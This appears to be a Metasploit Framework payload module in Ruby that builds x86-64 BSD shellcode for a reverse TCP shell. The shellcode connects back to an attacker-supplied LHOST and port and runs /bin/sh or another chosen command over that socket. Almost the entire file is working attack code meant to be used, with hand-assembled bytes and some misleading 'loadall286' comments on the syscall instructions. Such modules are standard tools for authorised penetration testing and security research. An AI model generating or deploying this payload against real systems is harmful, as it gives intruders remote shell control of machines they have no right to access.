##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


require 'msf/core'
require 'msf/core/handler/reverse_tcp'

module MetasploitModule

  CachedSize = 98

  include Msf::Payload::Single
  include Msf::Payload::Bsd
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'BSD x64 Shell Reverse TCP',
      'Description'   => 'Connect back to attacker and spawn a command shell',
      'Author'        => [
        'nemo <nemo[at]felinemenace.org>',
        'joev' # copy pasta monkey
      ],
      'License'       => MSF_LICENSE,
      'Platform'      => 'bsd',
      'Arch'          => ARCH_X86_64,
      'Handler'       => Msf::Handler::ReverseTcp,
      'Session'       => Msf::Sessions::CommandShellUnix
    ))

    # exec payload options

    register_options(
      [
        OptString.new('CMD',   [ true,  "The command string to execute", "/bin/sh" ]),
        Opt::LHOST,
        Opt::LPORT(4444)
    ], self.class)
  end

  # build the shellcode payload dynamically based on the user-provided CMD
  def generate
    lhost = datastore['LHOST'] || '127.0.0.1'

    # OptAddress allows either an IP or hostname, we only want IPv4
    if not Rex::Socket.is_ipv4?(lhost)
      raise ArgumentError, "LHOST must be in IPv4 format."
    end

    cmd  = (datastore['CMD'] || '') + "\x00"
    port = [datastore['LPORT'].to_i].pack('n')
    ipaddr = [lhost.split('.').inject(0) {|t,v| (t << 8 ) + v.to_i}].pack("N")

    call = "\xe8" + [cmd.length].pack('V')
    payload =
      "\x31\xc0" +                                 # xor eax,eax
      "\x83\xc0\x61" +                             # add eax,0x61
      "\x6A\x02" +                                 # push byte +0x2
      "\x5F" +                                     # pop rdi
      "\x6A\x01" +                                 # push byte +0x1
      "\x5E" +                                     # pop rsi
      "\x48\x31\xD2" +                             # xor rdx,rdx
      "\x0F\x05" +                                 # loadall286
      "\x49\x89\xC4" +                             # mov r12,rax
      "\x48\x89\xC7" +                             # mov rdi,rax
      "\x31\xc0" +                                 # xor eax,eax
      "\x83\xc0\x62" +                             # add eax,0x62
      "\x48\x31\xF6" +                             # xor rsi,rsi
      "\x56" +                                     # push rsi
      "\x48\xBE\x00\x02" + port +                  # mov rsi,0x100007fb3150200
      ipaddr +
      "\x56" +                                     # push rsi
      "\x48\x89\xE6" +                             # mov rsi,rsp
      "\x6A\x10" +                                 # push byte +0x10
      "\x5A" +                                     # pop rdx
      "\x0F\x05" +                                 # loadall286
      "\x4C\x89\xE7" +                             # mov rdi,r12
      "\x6A\x03" +                                 # push byte +0x3
      "\x5E" +                                     # pop rsi
      "\x48\xFF\xCE" +                             # dec rsi
      "\x6A\x5A" +                                 # push +byte 0x5a
      "\x58" +                                     # pop rax
      "\x0F\x05" +                                 # loadall286
      "\x75\xF6" +                                 # jne -0x8
      "\x31\xc0" +                                 # xor eax,eax
      "\x83\xc0\x3B" +                             # add eax,0x3b
      call +                                       # call CMD.len
      cmd +                                        # CMD
      "\x48\x8B\x3C\x24" +                         # mov rdi,[rsp]
      "\x48\x31\xD2" +                             # xor rdx,rdx
      "\x52" +                                     # push rdx
      "\x57" +                                     # push rdi
      "\x48\x89\xE6" +                             # mov rsi,rsp
      "\x0F\x05"                                   # loadall286
  end
end
